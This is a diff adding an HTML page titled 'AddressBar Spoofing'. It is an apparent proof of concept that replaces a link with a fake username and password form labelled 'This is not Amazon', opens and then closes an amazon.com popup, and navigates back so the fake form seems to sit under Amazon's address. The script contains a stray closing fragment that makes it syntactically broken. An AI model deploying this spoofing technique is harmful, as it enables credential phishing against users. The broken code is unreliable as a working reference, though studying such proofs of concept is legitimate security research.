@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AddressBar Spoofing</title>
+</head>
+<body>
+        <a id="spoof-link" href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
+
+    <script>
+        function startSpoof() {
+            const link = document.getElementById("spoof-link");
+            if (link) {
+                link.outerHTML = `
+                    <h1>This is not Amazon</h1>
+                    <input type="text" placeholder="Username" id="username"><br>
+                    <input type="password" placeholder="Password" id="password"><br>
+                    <button action="#" method="post">Click me</button>
+                `;
+            }
+
+            const popup = window.open("https://www.amazon.com/", "_blank");
+
+            if (!popup) {
+                alert("Pop-up diblokir. Izinkan pop-up lalu coba lagi.");
+                return;
+            }
+
+            popup.location.href = "https://www.amazon.com/";
+
+            setTimeout(() => {
+                try {
+                    popup.close();
+                } catch (err) {
+                    console.warn("Gagal menutup popup:", err);
+                }
+
+                window.history.back();
+            }, 2000);
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
